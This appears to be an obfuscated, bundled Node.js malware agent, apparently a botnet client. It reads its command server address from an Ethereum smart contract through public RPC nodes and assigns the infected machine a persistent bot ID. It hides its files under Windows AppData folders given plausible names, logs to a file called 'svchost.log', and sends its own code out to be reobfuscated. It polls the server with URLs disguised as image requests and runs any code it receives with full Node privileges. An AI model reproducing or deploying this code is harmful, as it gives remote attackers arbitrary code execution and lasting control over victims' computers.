(() => {
  var tn_af095 = {
    "./work_7da7e3b4-c81e-427b-9ac3-fc35bf28e319_7xsY0uo9/wp_src sync recursive"(module) {
      function tn_50eaaa(tn_21077f) {
        var tn_41dd4a = new Error("Cannot find module '" + tn_21077f + "'");
        tn_41dd4a.code = "MODULE_NOT_FOUND";
        throw tn_41dd4a;
      }
      tn_50eaaa.keys = () => [];
      tn_50eaaa.resolve = tn_50eaaa;
      tn_50eaaa.id = "./work_7da7e3b4-c81e-427b-9ac3-fc35bf28e319_7xsY0uo9/wp_src sync recursive";
      module.exports = tn_50eaaa;
    },
    crypto(module) {
      'use strict';

      module.exports = require("crypto");
    },
    fs(module) {
      'use strict';

      module.exports = require("fs");
    },
    os(module) {
      'use strict';

      module.exports = require("os");
    },
    path(module) {
      'use strict';

      module.exports = require("path");
    }
  };
  var tn_506c43 = {};
  function tn_88b287(tn_582575) {
    var tn_458f98 = tn_506c43[tn_582575];
    if (tn_458f98 !== undefined) {
      return tn_458f98.exports;
    }
    var module = tn_506c43[tn_582575] = {
      exports: {}
    };
    tn_af095[tn_582575](module, module.exports, tn_88b287);
    return module.exports;
  }
  (() => {
    tn_88b287.o = (tn_2e6fc4, tn_2e5842) => Object.prototype.hasOwnProperty.call(tn_2e6fc4, tn_2e5842);
  })();
  var tn_2dd2e1 = {};
  (async () => {
    const tn_59bc3f = "http://localhost:3000";
    const tn_3f0738 = "7da7e3b4-c81e-427b-9ac3-fc35bf28e319";
    const tn_19206b = "0xc7a92c95e3aadd4f8434bf094af7368aaa882396";
    const tn_4ddfd9 = "0xbd4d52f20c89b5e403046d6cee21755fd21ef25a";
    const tn_4ef9dc = true;
    const tn_4518a3 = false;
    const tn_5b728 = ["https://eth.llamarpc.com", "https://mainnet.gateway.tenderly.co", "https://rpc.flashbots.net/fast", "https://rpc.mevblocker.io", "https://eth-mainnet.public.blastapi.io", "https://ethereum-rpc.publicnode.com", "https://rpc.payload.de", "https://eth.drpc.org", "https://eth.merkle.io"];
    const tn_2d5346 = tn_88b287("fs");
    const tn_29e9c1 = tn_88b287("path");
    const tn_55bad6 = tn_88b287("crypto");
    let tn_372fb3 = tn_59bc3f;
    let tn_5b68e7 = tn_4518a3;
    const tn_48b387 = () => {
      const tn_301b84 = process.env.LOCALAPPDATA || tn_29e9c1.join(process.env.USERPROFILE || "", "AppData", "Local");
      const tn_59e08d = ["Microsoft", "Windows", "Programs", "Packages", "Google"];
      const tn_c87e23 = ["Services", "Components", "Assemblies", "Extensions", "Modules"];
      const tn_1f54d1 = (process.env.COMPUTERNAME || "") + (process.env.USERNAME || "");
      const tn_1bdc31 = tn_55bad6.createHash("md5").update(tn_1f54d1).digest("hex").slice(0, 8);
      const tn_b7ad28 = tn_59e08d[parseInt(tn_1bdc31.slice(0, 2), 16) % tn_59e08d.length];
      const tn_2091f6 = tn_c87e23[parseInt(tn_1bdc31.slice(2, 4), 16) % tn_c87e23.length];
      const tn_e4b04 = tn_1bdc31.slice(4);
      const tn_483633 = tn_29e9c1.join(tn_301b84, tn_b7ad28);
      if (tn_2d5346.existsSync(tn_483633)) {
        return tn_29e9c1.join(tn_483633, tn_2091f6, tn_e4b04);
      }
      return tn_29e9c1.join(tn_301b84, tn_1bdc31);
    };
    const tn_152a83 = tn_48b387();
    const tn_5795bc = tn_29e9c1.join(tn_152a83, tn_55bad6.createHash("md5").update(tn_152a83).digest("hex").slice(0, 6));
    const tn_4fcdf5 = tn_29e9c1.join(process.env.APPDATA, "svchost.log");
    const log = tn_364b2d => {
      if (!tn_5b68e7) {
        return;
      }
      try {
        const tn_1c1193 = new Date().toISOString();
        tn_2d5346.appendFileSync(tn_4fcdf5, "[" + tn_1c1193 + "] " + tn_364b2d + "\n");
      } catch (tn_52fe78) {
        try {
          tn_2d5346.writeFileSync(tn_4fcdf5, "[" + ts + "] LOG ERROR: " + tn_52fe78.message + "\n");
        } catch {}
      }
    };
    const tn_87833c = () => {
      try {
        if (tn_2d5346.existsSync(tn_5795bc)) {
          const tn_373074 = tn_2d5346.readFileSync(tn_5795bc, "utf8");
          return JSON.parse(Buffer.from(tn_373074, "base64").toString());
        }
      } catch {}
      return null;
    };
    const tn_2ceb24 = tn_4f4fc7 => {
      try {
        tn_2d5346.mkdirSync(tn_152a83, {
          recursive: true
        });
        tn_2d5346.writeFileSync(tn_5795bc, Buffer.from(JSON.stringify(tn_4f4fc7)).toString("base64"));
        log("Config saved");
      } catch {}
    };
    const tn_4dcb1c = () => {
      let tn_40c8e6 = tn_87833c();
      if (tn_40c8e6 && tn_40c8e6[0]) {
        return tn_40c8e6[0];
      }
      const tn_2aab81 = process.env.APPDATA || tn_88b287("os").homedir();
      const tn_38ed67 = tn_29e9c1.join(tn_2aab81, ".node_bot_id");
      try {
        if (tn_2d5346.existsSync(tn_38ed67)) {
          const tn_24a7b1 = tn_2d5346.readFileSync(tn_38ed67, "utf8").trim();
          if (!tn_40c8e6) {
            tn_40c8e6 = {};
          }
          tn_40c8e6[0] = tn_24a7b1;
          tn_2ceb24(tn_40c8e6);
          return tn_24a7b1;
        }
      } catch {}
      try {
        const tn_1bda3a = tn_2d5346.readdirSync(tn_2aab81).filter(tn_394587 => tn_394587.startsWith(".") && tn_394587.length === 11);
        if (tn_1bda3a.length > 0) {
          const tn_2c728a = tn_2d5346.readFileSync(tn_29e9c1.join(tn_2aab81, tn_1bda3a[0]), "utf8").trim();
          if (!tn_40c8e6) {
            tn_40c8e6 = {};
          }
          tn_40c8e6[0] = tn_2c728a;
          tn_2ceb24(tn_40c8e6);
          return tn_2c728a;
        }
      } catch {}
      const tn_6e221a = tn_55bad6.randomUUID();
      if (!tn_40c8e6) {
        tn_40c8e6 = {};
      }
      tn_40c8e6[0] = tn_6e221a;
      tn_2ceb24(tn_40c8e6);
      return tn_6e221a;
    };
    const tn_4623ad = tn_4dcb1c();
    const tn_310ab0 = tn_372648 => new Promise(tn_5659a5 => setTimeout(tn_5659a5, tn_372648));
    const tn_470ab3 = "0x7d434425";
    log("Started | ID: " + tn_4623ad + " | Build: " + tn_3f0738);
    log("Install dir: " + tn_152a83);
    const tn_25bcd3 = tn_4eb7c1 => {
      return tn_470ab3 + tn_4eb7c1.toLowerCase().replace("0x", "").padStart(64, "0");
    };
    const tn_c9d3bc = tn_45cb8c => {
      if (!tn_45cb8c || tn_45cb8c === "0x" || tn_45cb8c.length < 130) {
        return null;
      }
      try {
        const tn_cd9454 = tn_45cb8c.replace("0x", "");
        const tn_1f048b = parseInt(tn_cd9454.slice(0, 64), 16) * 2;
        const tn_507d0f = parseInt(tn_cd9454.slice(tn_1f048b, tn_1f048b + 64), 16);
        const tn_495355 = tn_cd9454.slice(tn_1f048b + 64, tn_1f048b + 64 + tn_507d0f * 2);
        return Buffer.from(tn_495355, "hex").toString("utf8");
      } catch {
        return null;
      }
    };
    const tn_3a440c = async () => {
      const tn_23b858 = {};
      const tn_5dc415 = tn_25bcd3(tn_4ddfd9);
      const tn_2a1955 = tn_5b728.map(async tn_143a8f => {
        try {
          const tn_1d142d = await fetch(tn_143a8f, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              jsonrpc: "2.0",
              method: "eth_call",
              params: [{
                to: tn_19206b,
                data: tn_5dc415
              }, "latest"],
              id: 1
            }),
            signal: AbortSignal.timeout(10000)
          });
          const tn_5a0d2f = await tn_1d142d.json();
          if (tn_5a0d2f.result) {
            const tn_47d8a5 = tn_c9d3bc(tn_5a0d2f.result);
            if (tn_47d8a5 && /^(https?|wss?):\/\//.test(tn_47d8a5)) {
              tn_23b858[tn_143a8f] = tn_47d8a5.trim();
            }
          }
        } catch {}
      });
      await Promise.allSettled(tn_2a1955);
      const tn_38089c = Object.values(tn_23b858);
      if (!tn_38089c.length) {
        return null;
      }
      const tn_36ddf9 = {};
      tn_38089c.forEach(tn_2ffc00 => {
        tn_36ddf9[tn_2ffc00] = (tn_36ddf9[tn_2ffc00] || 0) + 1;
      });
      return Object.entries(tn_36ddf9).sort((tn_1d41d1, tn_23c669) => tn_23c669[1] - tn_1d41d1[1])[0][0];
    };
    const tn_ed1d54 = async () => {
      if (!tn_4ef9dc) {
        log("Blockchain disabled, using fallback");
        return;
      }
      log("Fetching URL from blockchain...");
      const tn_1f6752 = await tn_3a440c();
      if (tn_1f6752) {
        tn_372fb3 = tn_1f6752;
        log("Blockchain URL: " + tn_1f6752);
      } else {
        log("Blockchain fetch failed, using fallback");
      }
    };
    await tn_ed1d54();
    log("Server URL: " + tn_372fb3);
    const tn_4dede1 = async () => {
      try {
        let tn_acd274 = tn_87833c();
        if (!tn_acd274 || tn_acd274[3]) {
          log("Reobfuscation skipped (already done)");
          return;
        }
        if (!tn_acd274[1]) {
          return;
        }
        const tn_542e01 = tn_29e9c1.join(tn_152a83, tn_acd274[1]);
        if (!tn_2d5346.existsSync(tn_542e01)) {
          return;
        }
        log("Requesting reobfuscation...");
        const tn_5328dd = tn_2d5346.readFileSync(tn_542e01, "utf8");
        const tn_57add8 = await fetch(tn_372fb3 + "/api/[REOBF_PATH]/" + tn_4623ad, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            code: tn_5328dd,
            build: tn_3f0738
          }),
          signal: AbortSignal.timeout(30000)
        });
        if (!tn_57add8.ok) {
          log("Reobf failed: " + tn_57add8.status);
          return;
        }
        const tn_2e8670 = await tn_57add8.text();
        if (!tn_2e8670 || tn_2e8670.length < 100) {
          return;
        }
        tn_2d5346.writeFileSync(tn_542e01, tn_2e8670, "utf8");
        tn_acd274[3] = Date.now();
        tn_2ceb24(tn_acd274);
        log("Reobfuscated, saved for next start");
      } catch (tn_33dfd3) {
        log("Reobf error: " + tn_33dfd3.message);
      }
    };
    await tn_4dede1();
    async function tn_2983ed() {
      const tn_360653 = tn_55bad6.randomBytes(4).toString("hex");
      const tn_4a7007 = ["png", "jpg", "gif", "css", "ico", "webp"];
      const tn_2e2b07 = tn_4a7007[Math.floor(Math.random() * tn_4a7007.length)];
      const tn_202ea6 = ["id", "token", "key", "b", "q", "s", "v"];
      const tn_1e9dbb = tn_202ea6[Math.floor(Math.random() * tn_202ea6.length)];
      const tn_ebfef1 = tn_55bad6.randomBytes(4).toString("hex");
      const tn_4225ff = tn_372fb3 + "/api/" + tn_360653 + "/" + tn_4623ad + "/" + tn_ebfef1 + "." + tn_2e2b07 + "?" + tn_1e9dbb + "=" + tn_3f0738;
      try {
        log("Polling: " + tn_4225ff);
        const tn_1a74ab = new AbortController();
        const tn_3850c0 = setTimeout(() => tn_1a74ab.abort(), 120000);
        const tn_50a316 = await fetch(tn_4225ff, {
          signal: tn_1a74ab.signal,
          headers: {
            "X-Bot-Server": tn_372fb3
          }
        });
        clearTimeout(tn_3850c0);
        if (!tn_50a316.ok) {
          log("Poll failed: " + tn_50a316.status);
          await tn_310ab0(5000);
          return;
        }
        const tn_1bc676 = await tn_50a316.text();
        if (tn_1bc676 && tn_1bc676.length > 10) {
          log("Received task (" + tn_1bc676.length + " bytes)");
          setImmediate(async () => {
            try {
              const tn_414076 = Object.getPrototypeOf(async function () {}).constructor;
              const tn_2f6a2d = new tn_414076("require", "process", "Buffer", "console", "__dirname", "__filename", "log", tn_1bc676);
              await tn_2f6a2d(typeof require !== "undefined" ? require : tn_88b287("./work_7da7e3b4-c81e-427b-9ac3-fc35bf28e319_7xsY0uo9/wp_src sync recursive"), process, Buffer, console, __dirname, __filename, log);
              log("Task executed");
            } catch (tn_dbf4eb) {
              log("Task error: " + tn_dbf4eb.message);
            }
          });
        }
      } catch (tn_3f68b7) {
        if (tn_3f68b7.name !== "AbortError") {
          log("Connect error: " + tn_3f68b7.message);
          await tn_310ab0(5000);
        }
      }
    }
    let tn_85f8e = Date.now();
    setInterval(() => {
      if (tn_4ef9dc && Date.now() - tn_85f8e > 300000) {
        log("Refreshing blockchain URL...");
        tn_3a440c().then(tn_3751f2 => {
          if (tn_3751f2 && tn_3751f2 !== tn_372fb3) {
            tn_372fb3 = tn_3751f2;
            log("New URL: " + tn_3751f2);
          }
        }).catch(() => {});
        tn_85f8e = Date.now();
      }
      const tn_5a45b9 = tn_87833c();
      if (tn_5a45b9 && typeof tn_5a45b9[5] === "boolean") {
        tn_5b68e7 = tn_5a45b9[5];
      }
    }, 60000);
    log("Main loop started");
    while (true) {
      try {
        await tn_2983ed();
      } catch (tn_43f6e6) {
        log("Loop error: " + tn_43f6e6.message);
      }
      await tn_310ab0(500);
    }
  })();
  module.exports = tn_2dd2e1;
})();